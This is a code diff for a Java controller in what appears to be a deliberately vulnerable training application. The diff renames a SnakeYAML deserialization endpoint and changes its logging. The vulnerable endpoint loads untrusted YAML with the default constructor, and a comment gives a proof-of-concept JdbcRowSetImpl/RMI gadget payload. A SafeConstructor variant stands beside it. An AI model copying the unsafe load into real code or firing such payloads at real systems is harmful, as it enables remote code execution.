@@ -1,6 +1,5 @@
-package com.best.hello.controller.Deserialize;
+package com.best.hello.controller.Deserialization;
 
-import com.best.hello.entity.Person;
 import io.swagger.annotations.ApiOperation;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -12,9 +11,9 @@ import org.yaml.snakeyaml.constructor.SafeConstructor;
 
 
 @RestController
-@RequestMapping("/Deserialize/yaml")
-public class YamlVul {
-    Logger log = LoggerFactory.getLogger(YamlVul.class);
+@RequestMapping("/vulnapi/Deserialization/SnakeYaml")
+public class SnakeYamlVul {
+    Logger log = LoggerFactory.getLogger(SnakeYamlVul.class);
 
     /**
      * @poc content=!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2222/exp', autoCommit: true}
@@ -25,7 +24,7 @@ public class YamlVul {
     public void vul(String content) {
         Yaml y = new Yaml();
         y.load(content);
-        log.info("[vul] SnakeYaml反序列化: " + content);
+        log.info("[vul] SnakeYaml反序列化: {}", content);
     }
 
     @ApiOperation(value = "safe：SnakeYaml")
@@ -35,7 +34,7 @@ public class YamlVul {
         try {
             Yaml y = new Yaml(new SafeConstructor());
             y.load(content);
-            log.info("[safe] SnakeYaml反序列化: " + content);
+            log.info("[safe] SnakeYaml反序列化: {}", content);
         } catch (Exception e) {
             log.warn("[error] SnakeYaml反序列化失败", e);
         }
